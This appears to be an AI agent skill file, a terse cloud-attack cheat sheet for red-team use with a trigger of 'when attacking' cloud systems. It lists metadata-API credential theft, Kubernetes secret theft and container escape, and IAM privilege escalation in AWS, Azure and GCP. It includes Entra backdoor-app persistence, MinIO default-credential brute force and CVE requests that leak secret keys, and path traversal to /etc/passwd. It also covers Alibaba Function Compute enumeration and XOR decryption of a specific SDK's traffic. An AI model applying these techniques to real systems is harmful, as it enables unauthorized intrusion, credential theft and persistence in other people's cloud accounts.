---
name: cloud-attack-methods
description: >-
  Cloud attacks: metadata API, S3/K8s, AWS/Azure/GCP identity privilege escalation, MinIO matrix, Alibaba Cloud FC, ChengZi SDK decryption. Use when attacking cloud metadata, IAM, K8s, MinIO, Aliyun FC, or cloud post-ex.
metadata:
  tags: [penetration-testing, penetration-testing, red-team]
---

## Cloud Attack Techniques

```
=== Cloud ===
Metadata API: AWS 169.254.169.254/latest/meta-data/iam/ | Azure -H Metadata:true | GCP metadata.google.internal | Alibaba Cloud 100.100.100.200
Object storage: aws s3 ls --no-sign-request | K8s: /var/run/secrets/.../token → api/v1 retrieve secrets/exec pods → cluster-admin
🚨Cloud identity attacks (privilege escalation and lateral movement after obtaining a key/token):
  AWS: enumerate-iam/cloudfox/ScoutSuite enumerate permissions → pacu automatically finds privesc (iam:PassRole+lambda/ec2/glue and 18+ paths) | STS AssumeRole cross-account | Lambda environment variable secret theft
  Azure/Entra: roadtools (roadrecon dump tenant)/AADInternals | device code/refresh token | Managed Identity IMDS token theft | Automation Runbook RCE | Key Vault read secrets
  Entra post-exploitation: GraphRunner (Graph API enumeration/search mail/add backdoor App) | add credentials to a service principal (stealthy persistence) | dynamic group abuse | PRT theft for lateral movement
  GCP: service account token (metadata) | serviceAccountTokenCreator/actAs privilege escalation | gcloud enumeration
🚨K8s deep dive (after obtaining cluster network/pod access): kubelet 10250 unauthenticated (/pods list, /exec into any container) | etcd 2379 unauthenticated read of all secrets | API Server anonymous | RBAC over-privileged SA (kubectl auth can-i --list) | privileged pod host mount escape | cloud K8s steal node identity → IMDS
🚨MinIO attack matrix:
  Fingerprint: Server: MinIO | /minio/health/live → 200 (empty body) | /minio/health/cluster → 200 | 9000 (API)+9001 (Console)
  Console brute force: POST http://IP:9001/api/v1/login body={"accessKey":"minioadmin","secretKey":"minioadmin"} | 403="invalid Login"
  STS API: POST /?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&WebIdentityToken=JWT → requires JWT provider configuration
  CVE-2023-28432: POST /minio/health/cluster?verify (information disclosure, returns environment variables including MINIO_SECRET_KEY)
  CVE-2023-28434: path traversal /bucket/..%2F..%2Fetc/passwd → XMinioInvalidResourceName (unusable if patched)
  Anonymous access: GET /bucket-name/ → ListBucket (200)=anonymous read | PUT /bucket/file → AccessDenied (403)=anonymous write disabled
  Upload bypass: the application layer's sign verification checks the dir parameter but does not validate it → arbitrary bucket write is possible (sign only checks cid+et+og, not dir)
  Extension bypass: .jsp;.jpg / .jsp%00.jpg pass the application blacklist, but MinIO stores them as static files (image/jpeg) and does not execute them
🚨Alibaba Cloud FC function (fcapp.run) enumeration:
  Identification: URL contains *.cn-{region}.fcapp.run → Alibaba Cloud Function Compute (Serverless)
  Characteristics: POST returns "unauthorized method 'POST'" (405) = only accepts GET | 200+{"code":200,"msg":"Forbidden"} = path exists but parameters are missing
  Exploitation: GET /{path}/{id}.html → 302 redirect leaks the real CDN domain + auth_key signed URL (exposes CDN domain/bucket structure/signing algorithm)
  Enumeration: different path prefixes correspond to different APPs (/mkzavakx/ vs /kpqwbcoq/) | invalid ID → 302 to qzone.qq.com/404.html (fallback)
  Path traversal: FC normalizes correctly (../ ineffective), but different function paths can be enumerated
  CDN auth_key (Kunlun CDN kunlunaq.com): format=timestamp-rand-uid-md5(uri-timestamp-rand-uid-privatekey) → cracking requires privatekey | x-tengine-error exposes "denied by req auth"
  FC→CDN chain: FC function generates signed URL → kunlun/kijwsks.com CDN download | spoof the referer as Baidu (mo.baidu.com)
🚨ChengZi site builder (ChengZi SDK) decryption:
  Initialization: POST https://random.d3504.cn/init3 body={appkey,channelCode,...} → encrypted response (base64)
  Decryption: single-byte XOR key=0x96 → JSON (channelCode/fu download URL/csu tracking URL/ph installer package hash)
  d3504.cn goes through Cloudflare + Alibaba Cloud DDoS protection (aliyunddos) + Kunlun CDN (kunlunaq.com) → multiple layers of protection
  Key: fu field = real APK download FC function URL (may be in a different region from the landing page!) | csu = click tracking callback URL
```
